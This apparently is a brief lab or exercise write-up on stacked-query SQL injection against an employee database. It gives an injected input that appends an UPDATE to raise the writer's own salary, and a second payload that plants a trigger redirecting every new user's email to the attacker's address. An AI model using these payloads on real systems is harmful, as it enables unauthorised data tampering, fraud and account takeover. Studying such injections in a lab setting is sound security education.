We begin by query our own data, the SQL command is 

select userid, password, ssn, salary, email from employee where userid=INPUT

We now insert another command after this to update our own salary

INPUT = "1 and 'a'='b' update employee set salary=999999 where userid=101"

The resulting command is 

select userid, password, ssn, salary, email from employee where userid=1 and 'a'='b' update employee set salary=999999 where userid=101

This statement effectvely updates our salary to a higher value

TRIGGER:

For this part, we set ALL new user's email addr to ours, the format of trigger is:

 CREATE TRIGGER myTrigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='my@email.address.com' WHERE userid = NEW.userid

which we append to the query, resulting in the final query string being:

1 and 'a'='b' CREATE TRIGGER myTrigger BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='my@email.address.com' WHERE userid = NEW.userid END
